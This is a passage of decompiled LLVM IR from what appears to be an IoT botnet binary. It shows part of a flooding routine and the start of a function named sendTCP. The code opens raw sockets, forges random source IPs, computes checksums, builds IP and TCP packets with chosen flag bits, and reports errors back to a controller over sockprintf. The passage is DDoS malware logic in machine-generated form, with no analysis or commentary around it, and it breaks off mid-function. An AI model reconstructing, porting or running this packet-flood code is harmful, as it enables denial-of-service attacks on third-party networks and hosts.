  %v6_804e694 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e694, i32* %eax.global-to-local, align 4
  %v1_804e699 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804e69e = urem i32 %v1_804e699, 65536
  store i32 %v1_804e69e, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e6a4 = trunc i32 %v1_804e699 to i16
  store i16 %v1_804e6a4, i16* %v5_804e56a, align 4
  br i1 %v1_804e299, label %dec_label_pc_804e6ba, label %dec_label_pc_804e6ad

dec_label_pc_804e6ad:                             ; preds = %dec_label_pc_804e669
  %v1_804e6ad = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ba:                             ; preds = %dec_label_pc_804e669
  store i32 %v1_804e6bd.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804e6c0 = load i32, i32* @esp, align 4
  %v2_804e6c0 = inttoptr i32 %v1_804e6c0 to i32*
  store i32 %v1_804e6bd.pre-phi, i32* %v2_804e6c0, align 4
  %v3_804e6c3 = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %dec_label_pc_804e6ad, %dec_label_pc_804e6ba
  %storemerge10.in = phi i32 [ %v1_804e6ad, %dec_label_pc_804e6ad ], [ %v3_804e6c3, %dec_label_pc_804e6ba ]
  %storemerge = trunc i32 %storemerge10.in to i16
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %storemerge10.in, 65536
  %v4_804e6d1 = sdiv i32 %sext11, 65536
  store i32 %v4_804e6d1, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804e603, align 2
  %v2_804e6d8 = call i32 @rand_cmwc(i32 %v4_804e6d1)
  %v1_804e6dd = urem i32 %v2_804e6d8, 65536
  store i32 %v1_804e6dd, i32* %edx.global-to-local, align 4
  %v1_804e6e3 = trunc i32 %v2_804e6d8 to i16
  store i16 %v1_804e6e3, i16* %v4_804e6e3, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804e6ea = load i32, i32* @esp, align 4
  %v2_804e6ea = inttoptr i32 %v1_804e6ea to i32*
  store i32 %storemerge6, i32* %v2_804e6ea, align 4
  %v3_804e6ed = call i32 @GetRandomIP(i32 %v4_804e6d1, i32 %v13_804e28c)
  store i32 %v3_804e6ed, i32* %eax.global-to-local, align 4
  %v1_804e6f2 = load i32, i32* @esp, align 4
  %v2_804e6f2 = inttoptr i32 %v1_804e6f2 to i32*
  store i32 %v3_804e6ed, i32* %v2_804e6f2, align 4
  %v0_804e6f5 = call i32 @htonl()
  store i32 %v0_804e6f5, i32* %edx.global-to-local, align 4
  store i32 %v0_804e6f5, i32* %v3_804e6ff, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v3_804e705 = load i16, i16* %v2_804e628, align 2
  %v4_804e705 = zext i16 %v3_804e705 to i32
  store i32 %v4_804e705, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e70e = load i32, i32* @esp, align 4
  %v2_804e70e = add i32 %v1_804e70e, 4
  %v3_804e70e = inttoptr i32 %v2_804e70e to i32*
  store i32 %v4_804e705, i32* %v3_804e70e, align 4
  %v0_804e712 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e712 = load i32, i32* @esp, align 4
  %v2_804e712 = inttoptr i32 %v1_804e712 to i32*
  store i32 %v0_804e712, i32* %v2_804e712, align 4
  %v3_804e715 = inttoptr i32 %v4_804e6d1 to i16*
  %v4_804e715 = call i32 @csum(i16* %v3_804e715, i32 %v13_804e28c)
  %v1_804e71a = urem i32 %v4_804e715, 65536
  store i32 %v1_804e71a, i32* %edx.global-to-local, align 4
  %v1_804e720 = trunc i32 %v4_804e715 to i16
  store i16 %v1_804e720, i16* %v4_804e643, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804e727 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804e72a = icmp eq i1 %v15_804e727, false
  br i1 %v1_804e72a, label %dec_label_pc_804e749, label %dec_label_pc_804e72c

dec_label_pc_804e72c:                             ; preds = %dec_label_pc_804e6ce
  %v0_804e72c = load i32, i32* @esp, align 4
  %v1_804e72c = inttoptr i32 %v0_804e72c to i32*
  store i32 0, i32* %v1_804e72c, align 4
  %v2_804e733 = inttoptr i32 %v4_804e6d1 to i32*
  %v3_804e733 = call i32 @__GI_time(i32* %v2_804e733)
  store i32 %v3_804e733, i32* %eax.global-to-local, align 4
  %v8_804e73b = icmp sgt i32 %v3_804e733, %v5_804e653
  br i1 %v8_804e73b, label %dec_label_pc_804e779, label %dec_label_pc_804e669

dec_label_pc_804e749:                             ; preds = %dec_label_pc_804e6ce
  %v4_804e749 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804e74f = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804e752 = icmp eq i1 %v15_804e74f, false
  br i1 %v1_804e752, label %dec_label_pc_804e771, label %dec_label_pc_804e754

dec_label_pc_804e754:                             ; preds = %dec_label_pc_804e749
  store i32 %v4_804e757, i32* %eax.global-to-local, align 4
  %v1_804e75d = load i32, i32* @esp, align 4
  %v2_804e75d = inttoptr i32 %v1_804e75d to i32*
  store i32 %v4_804e757, i32* %v2_804e75d, align 4
  %v1_804e760 = sext i32 %v4_804e749 to i64
  %v2_804e760 = call i32 @usleep(i64 %v1_804e760)
  store i32 %v2_804e760, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e771:                             ; preds = %dec_label_pc_804e749
  %v4_804e771 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e72c, %dec_label_pc_804e4ad, %dec_label_pc_804e45e
  %v0_804e78228 = phi i32 [ %v3_804e4bd, %dec_label_pc_804e4ad ], [ %v3_804e46e, %dec_label_pc_804e45e ], [ %v3_804e733, %dec_label_pc_804e72c ]
  br label %dec_label_pc_804e77c

dec_label_pc_804e77c:                             ; preds = %dec_label_pc_804e3e6, %dec_label_pc_804e33d, %dec_label_pc_804e2be, %dec_label_pc_804e323, %dec_label_pc_804e779
  %v0_804e782 = phi i32 [ 0, %dec_label_pc_804e33d ], [ %v4_804e2ce, %dec_label_pc_804e2be ], [ %v3_804e333, %dec_label_pc_804e323 ], [ %v0_804e78228, %dec_label_pc_804e779 ], [ %v2_804e3ed, %dec_label_pc_804e3e6 ]
  store i32 %v0_804e28b, i32* @ebx, align 4
  ret i32 %v0_804e782

; uselistorder directives
  uselistorder i32 %v4_804e749, { 2, 1, 0 }
  uselistorder i32 %v4_804e715, { 1, 0 }
  uselistorder i32 %v2_804e6d8, { 1, 0 }
  uselistorder i32 %v4_804e6d1, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804e699, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804e638, { 1, 0 }
  uselistorder i32 %v4_804e600, { 2, 1, 0 }
  uselistorder i32 %v1_804e6bd.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e5ec, { 2, 1, 0 }
  uselistorder i32 %v2_804e5c8, { 1, 0 }
  uselistorder i32 %v3_804e5b9, { 1, 0 }
  uselistorder i32 %v1_804e5b3, { 1, 0 }
  uselistorder i32 %v2_804e54f, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e521, { 1, 0 }
  uselistorder i32 %v4_804e450, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v4_804e404, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804e344, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804e340, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_804e315, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804e2be, { 1, 0 }
  uselistorder i32 %v1_804e2ac, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 36, 37, 39, 38, 42, 40, 41, 44, 43, 47, 45, 46, 50, 48, 49, 52, 51, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e77c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804e6ce, { 1, 0 }
  uselistorder label %dec_label_pc_804e669, { 1, 0 }
  uselistorder label %dec_label_pc_804e669.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e5fd, { 1, 0 }
  uselistorder label %dec_label_pc_804e528, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e6, { 1, 0 }
  uselistorder label %dec_label_pc_804e39c, { 1, 0 }
  uselistorder label %dec_label_pc_804e39c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e2be, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804e787 = load i32, i32* @esi, align 4
  %v0_804e788 = load i32, i32* @ebx, align 4
  %v15_804e789 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e7a0 = icmp eq i32 %arg2, 0
  %v1_804e7a4 = icmp eq i1 %v4_804e7a0, false
  br i1 %v1_804e7a4, label %dec_label_pc_804e7b4, label %dec_label_pc_804e7a6

dec_label_pc_804e7a6:                             ; preds = %entry
  %v1_804e7a6 = call i32 @rand_cmwc(i32 %v15_804e789)
  br label %dec_label_pc_804e7c9

dec_label_pc_804e7b4:                             ; preds = %entry
  %v1_804e7b7 = urem i32 %arg2, 65536
  store i32 %v1_804e7b7, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7b7, i32* %stack_var_-188, align 4
  %v1_804e7bd = trunc i32 %arg2 to i16
  %v2_804e7bd = call i32 @htons(i16 %v1_804e7bd)
  br label %dec_label_pc_804e7c9

dec_label_pc_804e7c9:                             ; preds = %dec_label_pc_804e7a6, %dec_label_pc_804e7b4
  %v2_804e7c9 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e7cc = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804e7cc, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v4_804e7d9 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804e7d9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e7de = icmp eq i32 %v4_804e7d9, 0
  br i1 %v1_804e7de, label %dec_label_pc_804e7e7, label %dec_label_pc_804ed40

dec_label_pc_804e7e7:                             ; preds = %dec_label_pc_804e7c9
  %v5_804e7ea = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804e7ea, i1* %cf.global-to-local, align 1
  %v15_804e7ea = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804e7ea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804e811 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e819 = icmp eq i32 %v4_804e811, 0
  %v1_804e81d = icmp eq i1 %v4_804e819, false
  br i1 %v1_804e81d, label %dec_label_pc_804e839, label %dec_label_pc_804e81f

dec_label_pc_804e81f:                             ; preds = %dec_label_pc_804e7e7
  %v0_804e81f = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e81f, i32* %eax.global-to-local, align 4
  store i32 %v0_804e81f, i32* %stack_var_-188, align 4
  %v3_804e82f = call i32 @sockprintf(i32 %v0_804e81f, i32 ptrtoint ([27 x i8]* @global_var_80590f0.300 to i32))
  store i32 %v3_804e82f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed40

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e7e7
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804e848 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  store i32 %v4_804e811, i32* %stack_var_-188, align 4
  %v6_804e865 = call i32 @__GI_setsockopt(i32 %v4_804e811, i32 0, i32 3, i32 %v2_804e848, i32 4)
  store i32 %v6_804e865, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e86a = icmp slt i32 %v6_804e865, 0
  %v1_804e86c = icmp eq i1 %v2_804e86a, false
  br i1 %v1_804e86c, label %dec_label_pc_804e888, label %dec_label_pc_804e86e

dec_label_pc_804e86e:                             ; preds = %dec_label_pc_804e839
  %v0_804e86e = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e86e, i32* %eax.global-to-local, align 4
  store i32 %v0_804e86e, i32* %stack_var_-188, align 4
  %v3_804e87e = call i32 @sockprintf(i32 %v0_804e86e, i32 ptrtoint ([33 x i8]* @global_var_805910c.301 to i32))
  store i32 %v3_804e87e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed40

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e839
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e888 = icmp eq i32 %arg4, 0
  %v1_804e88c = icmp eq i1 %v4_804e888, false
  br i1 %v1_804e88c, label %dec_label_pc_804e897, label %dec_label_pc_804e8ad

dec_label_pc_804e897:                             ; preds = %dec_label_pc_804e888
  %v5_804e89e = sub i32 32, %arg4
  %v10_804e89e = icmp ugt i32 %arg4, 32
  store i1 %v10_804e89e, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e8a6 = urem i32 %v5_804e89e, 32
  %v4_804e8a6 = icmp eq i32 %v2_804e8a6, 0
  br i1 %v4_804e8a6, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804e897
  %v5_804e8a6 = shl i32 1, %v2_804e8a6
  store i32 %v5_804e8a6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804e897, %bb
  %v0_804e8a8 = phi i32 [ 1, %dec_label_pc_804e897 ], [ %v5_804e8a6, %bb ]
  %v1_804e8a8 = sub i32 0, %v0_804e8a8
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e8a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8ad

dec_label_pc_804e8ad:                             ; preds = %dec_label_pc_804e888, %bb90
  %storemerge10 = phi i32 [ %v1_804e8a8, %bb90 ], [ 0, %dec_label_pc_804e888 ]
  %v1_804e8b0 = add i32 %arg6, 40
  %v1_804e8bc = add i32 %arg6, 70
  %v2_804e8bf = and i32 %v1_804e8bc, -16
  %v0_804e8c5 = load i32, i32* @esp, align 4
  %v2_804e8c5 = sub i32 %v0_804e8c5, %v2_804e8bf
  %v1_804e8c7 = add i32 %v2_804e8c5, 24
  store i32 %v1_804e8c7, i32* %edx.global-to-local, align 4
  %v1_804e8d1 = add i32 %v2_804e8c5, 39
  %v2_804e8d4 = and i32 %v1_804e8d1, -16
  %v1_804e8ec = add i32 %v2_804e8d4, 20
  %v5_804e8ef = inttoptr i32 %v1_804e8ec to i16*
  %v1_804e8f5 = add i32 %arg6, 20
  %v5_804e8f5 = icmp ugt i32 %arg6, -21
  store i1 %v5_804e8f5, i1* %cf.global-to-local, align 1
  store i32 %v1_804e8f5, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804e8fd = inttoptr i32 %v2_804e8c5 to i32*
  store i32 %storemerge10, i32* %v2_804e8fd, align 4
  %v2_804e900 = call i32 @GetRandomIP(i32 %v1_804e8b0, i32 %v2_804e8d4)
  store i32 %v2_804e900, i32* %eax.global-to-local, align 4
  %v1_804e905 = load i32, i32* @esp, align 4
  %v2_804e905 = inttoptr i32 %v1_804e905 to i32*
  store i32 %v2_804e900, i32* %v2_804e905, align 4
  %v0_804e908 = call i32 @htonl()
  %v3_804e90d = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e90d, i32* %edx.global-to-local, align 4
  %v0_804e910 = load i32, i32* @ebx, align 4
  %v1_804e910 = load i32, i32* @esp, align 4
  %v2_804e910 = add i32 %v1_804e910, 16
  %v3_804e910 = inttoptr i32 %v2_804e910 to i32*
  store i32 %v0_804e910, i32* %v3_804e910, align 4
  %v0_804e914 = load i32, i32* @esp, align 4
  %v1_804e914 = add i32 %v0_804e914, 12
  %v2_804e914 = inttoptr i32 %v1_804e914 to i32*
  store i32 6, i32* %v2_804e914, align 4
  %v1_804e91c = load i32, i32* @esp, align 4
  %v2_804e91c = add i32 %v1_804e91c, 8
  %v3_804e91c = inttoptr i32 %v2_804e91c to i32*
  store i32 %v0_804e908, i32* %v3_804e91c, align 4
  %v0_804e920 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e920 = load i32, i32* @esp, align 4
  %v2_804e920 = add i32 %v1_804e920, 4
  %v3_804e920 = inttoptr i32 %v2_804e920 to i32*
  store i32 %v0_804e920, i32* %v3_804e920, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804e927 = load i32, i32* @esp, align 4
  %v2_804e927 = inttoptr i32 %v1_804e927 to i32*
  store i32 %v2_804e8d4, i32* %v2_804e927, align 4
  %v0_804e92a = call i32 @makeIPPacket()
  store i32 %v0_804e92a, i32* %eax.global-to-local, align 4
  %v2_804e92f = call i32 @rand_cmwc(i32 %v1_804e8ec)
  %v1_804e934 = urem i32 %v2_804e92f, 65536
  store i32 %v1_804e934, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804e93a = trunc i32 %v2_804e92f to i16
  store i16 %v1_804e93a, i16* %v5_804e8ef, align 4
  %v2_804e93d = call i32 @rand_cmwc(i32 %v1_804e8ec)
  %v2_804e947 = add i32 %v2_804e8d4, 24
  %v3_804e947 = inttoptr i32 %v2_804e947 to i32*
  store i32 %v2_804e93d, i32* %v3_804e947, align 8
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804e94d = add i32 %v2_804e8d4, 28
  %v2_804e94d = inttoptr i32 %v1_804e94d to i32*
  store i32 0, i32* %v2_804e94d, align 4
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v1_804e957 = add i32 %v2_804e8d4, 32
  %v2_804e957 = inttoptr i32 %v1_804e957 to i8*
  %v3_804e957 = load i8, i8* %v2_804e957, align 16
  %v2_804e95b = urem i8 %v3_804e957, 16
  %v2_804e95d = or i8 %v2_804e95b, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804e95d, i8* %v2_804e957, align 16
  %v4_804e962 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e962, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e962, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805912d.302 to i32), i32* @edi, align 4
  %v7_804e980 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805912d.302, i32 0, i32 0), i32 4)
  %v8_804e980 = urem i32 %v7_804e980, 2
  %v9_804e980 = icmp eq i32 %v8_804e980, 0
  %v0_804e982 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e982 = or i1 %v0_804e982, %v9_804e980
  %v3_804e982 = zext i1 %v2_804e982 to i32
  %v4_804e982 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e982 = and i32 %v4_804e982, -256
  %v6_804e982 = or i32 %v3_804e982, %v5_804e982
  %v7_804e982 = xor i32 %v6_804e982, 1
  store i32 %v7_804e982, i32* @edx, align 4
  %v3_804e988 = and i32 %v7_804e980, -256
  %v1_804e98a = trunc i32 %v7_804e982 to i8
  %v3_804e98a = zext i1 %v0_804e982 to i8
  %v4_804e98a = sub nsw i8 %v1_804e98a, %v3_804e98a
  %v15_804e98a = icmp eq i8 %v4_804e98a, 0
  %v20_804e98a = zext i8 %v4_804e98a to i32
  %v23_804e98a = or i32 %v20_804e98a, %v3_804e988
  store i32 %v23_804e98a, i32* @ecx, align 4
  %v2_804e98e = sext i8 %v4_804e98a to i32
  store i32 %v2_804e98e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e993 = icmp eq i1 %v15_804e98a, false
  br i1 %v1_804e993, label %dec_label_pc_804e9d6, label %dec_label_pc_804e995

dec_label_pc_804e995:                             ; preds = %dec_label_pc_804e8ad
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v1_804e998 = add i32 %v2_804e8d4, 33
  %v2_804e998 = inttoptr i32 %v1_804e998 to i8*
  %v3_804e998 = load i8, i8* %v2_804e998, align 1
  %v2_804e99c = or i8 %v3_804e998, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e99c = zext i8 %v2_804e99c to i32
  store i32 %v7_804e99c, i32* %eax.global-to-local, align 4
  store i8 %v2_804e99c, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9a4 = load i8, i8* %v2_804e998, align 1
  %v2_804e9a8 = or i8 %v3_804e9a4, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9a8 = zext i8 %v2_804e9a8 to i32
  store i32 %v7_804e9a8, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9a8, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9b0 = load i8, i8* %v2_804e998, align 1
  %v2_804e9b4 = or i8 %v3_804e9b0, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9b4 = zext i8 %v2_804e9b4 to i32
  store i32 %v7_804e9b4, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9b4, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9bc = load i8, i8* %v2_804e998, align 1
  %v2_804e9c0 = or i8 %v3_804e9bc, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9c0 = zext i8 %v2_804e9c0 to i32
  store i32 %v7_804e9c0, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9c0, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9c8 = load i8, i8* %v2_804e998, align 1
  %v2_804e9cc = or i8 %v3_804e9c8, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9cc = zext i8 %v2_804e9cc to i32
  store i32 %v7_804e9cc, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9cc, i8* %v2_804e998, align 1
  %v0_804ebac.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804ebac

dec_label_pc_804e9d6:                             ; preds = %dec_label_pc_804e8ad
  store i32 %v4_804e962, i32* @eax, align 4
  %v0_804e9d9 = load i32, i32* @esp, align 4
  %v1_804e9d9 = add i32 %v0_804e9d9, 4
  %v2_804e9d9 = inttoptr i32 %v1_804e9d9 to i32*
  store i32 ptrtoint (i32* @global_var_8059131.303 to i32), i32* %v2_804e9d9, align 4
  %v0_804e9e1 = load i32, i32* @eax, align 4
  %v1_804e9e1 = load i32, i32* @esp, align 4
  %v2_804e9e1 = inttoptr i32 %v1_804e9e1 to i32*
  store i32 %v0_804e9e1, i32* %v2_804e9e1, align 4
  %v3_804e9e4 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805912d.302 to i32))
  store i32 %v3_804e9e4, i32* %eax.global-to-local, align 4
  %v5_804e9e9 = inttoptr i32 %v3_804e9e4 to i8*
  store i8* %v5_804e9e9, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eba217 = icmp eq i32 %v3_804e9e4, 0
  %v1_804eba624 = icmp eq i1 %v5_804eba217, false
  br i1 %v1_804eba624, label %dec_label_pc_804e9f1.lr.ph, label %dec_label_pc_804ebac

dec_label_pc_804e9f1.lr.ph:                       ; preds = %dec_label_pc_804e9d6
  %v1_804eb62 = add i32 %v2_804e8d4, 33
  %v2_804eb62 = inttoptr i32 %v1_804eb62 to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e9f1

dec_label_pc_804e9f1:                             ; preds = %dec_label_pc_804e9f1.lr.ph, %dec_label_pc_804eb8b
  %v3_804eb74 = phi i8* [ %v5_804e9e9, %dec_label_pc_804e9f1.lr.ph ], [ %tmp92, %dec_label_pc_804eb8b ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804e9f1.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804eb8b ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804e9f1.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804eb8b ]
  %v4_804e9f1 = ptrtoint i8* %v3_804eb74 to i32
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059133.304 to i32), i32* @edi, align 4
  %v7_804ea0f = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059133.304, i32 0, i32 0), i32 4)
  %v8_804ea0f = urem i32 %v7_804ea0f, 2
  %v9_804ea0f = icmp eq i32 %v8_804ea0f, 0
  %v0_804ea11 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea11 = or i1 %v0_804ea11, %v9_804ea0f
  %v3_804ea11 = zext i1 %v2_804ea11 to i32
  %v4_804ea11 = load i32, i32* @edx, align 4
  %v5_804ea11 = and i32 %v4_804ea11, -256
  %v6_804ea11 = or i32 %v3_804ea11, %v5_804ea11
  %v7_804ea11 = xor i32 %v6_804ea11, 1
  store i32 %v7_804ea11, i32* %edx.global-to-local, align 4
  %v3_804ea17 = and i32 %v7_804ea0f, -256
  %v1_804ea19 = trunc i32 %v7_804ea11 to i8
  %v3_804ea19 = zext i1 %v0_804ea11 to i8
  %v4_804ea19 = sub nsw i8 %v1_804ea19, %v3_804ea19
  %v15_804ea19 = icmp eq i8 %v4_804ea19, 0
  %v20_804ea19 = zext i8 %v4_804ea19 to i32
  %v23_804ea19 = or i32 %v20_804ea19, %v3_804ea17
  store i32 %v23_804ea19, i32* @ecx, align 4
  %v2_804ea1d = sext i8 %v4_804ea19 to i32
  store i32 %v2_804ea1d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea22 = icmp eq i1 %v15_804ea19, false
  br i1 %v1_804ea22, label %dec_label_pc_804ea36, label %dec_label_pc_804ea24

dec_label_pc_804ea24:                             ; preds = %dec_label_pc_804e9f1
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804ea27 = load i8, i8* %v2_804eb62, align 1
  %v2_804ea2b = or i8 %v3_804ea27, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ea2b = zext i8 %v2_804ea2b to i32
